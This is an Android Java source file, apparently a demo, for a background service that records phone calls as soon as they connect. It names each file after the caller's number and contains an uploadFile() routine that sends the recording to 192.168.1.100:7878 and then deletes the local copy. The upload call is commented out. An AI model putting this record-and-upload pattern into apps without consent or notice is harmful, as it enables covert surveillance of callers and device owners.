package com.example.incomingcalllistener;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast; 


public class PhoneService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Toast.makeText(this, "[MyService onStart]", Toast.LENGTH_LONG).show(); 
		System.out.println("服务加载中");
//		第一：获取电话服务管理器TelephonyManager 
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//		第二：通过TelephonyManager注册我们要监听的电话状态改变事件。
		telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}
	
	private final class PhoneListener extends PhoneStateListener{
		private String incomingNumber;
		private File file;
		private MediaRecorder mediaRecorder;
		
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				this.incomingNumber = incomingNumber;
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING://来电
					
					
					System.out.println("等待接通电话="+incomingNumber);  
					break;

				case TelephonyManager.CALL_STATE_OFFHOOK://接通电话
					System.out.println("已经接通电话="+incomingNumber);  
					
					
					file = new File(Environment.getExternalStorageDirectory(), incomingNumber+System.currentTimeMillis()+ ".3gp");
					System.out.println("存储的文件名字 ：  "+file.getName());
					mediaRecorder = new MediaRecorder();
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//只能录自己的声音
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					mediaRecorder.prepare();
					mediaRecorder.start();//开始录音
					
					break;
					
				case TelephonyManager.CALL_STATE_IDLE://挂断电话后回归到空闲状态
					System.out.println("已经挂断电话。。。。。。。"); 
					
					if(mediaRecorder != null){
						mediaRecorder.stop();
						mediaRecorder.release();
						mediaRecorder = null;
//						uploadFile();
					}
					
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		private void uploadFile() {
			new Thread(new Runnable() {				
				public void run() {
					try {
						if(file!=null && file.exists()){
							Socket socket = new Socket("192.168.1.100", 7878);
				            OutputStream outStream = socket.getOutputStream();
				            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
				            outStream.write(head.getBytes());
				            
				            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
							String response = StreamTool.readLine(inStream);
				            String[] items = response.split(";");
							String position = items[1].substring(items[1].indexOf("=")+1);
							
							RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
							fileOutStream.seek(Integer.valueOf(position));
							byte[] buffer = new byte[1024];
							int len = -1;
							while( (len = fileOutStream.read(buffer)) != -1){
								outStream.write(buffer, 0, len);
							}
							fileOutStream.close();
							outStream.close();
				            inStream.close();
				            socket.close();
				            file.delete();
				            file = null;
			            }
			        } catch (Exception e) {                    
			            e.printStackTrace();
			        }
				}
			}).start();
		}		
	}
}
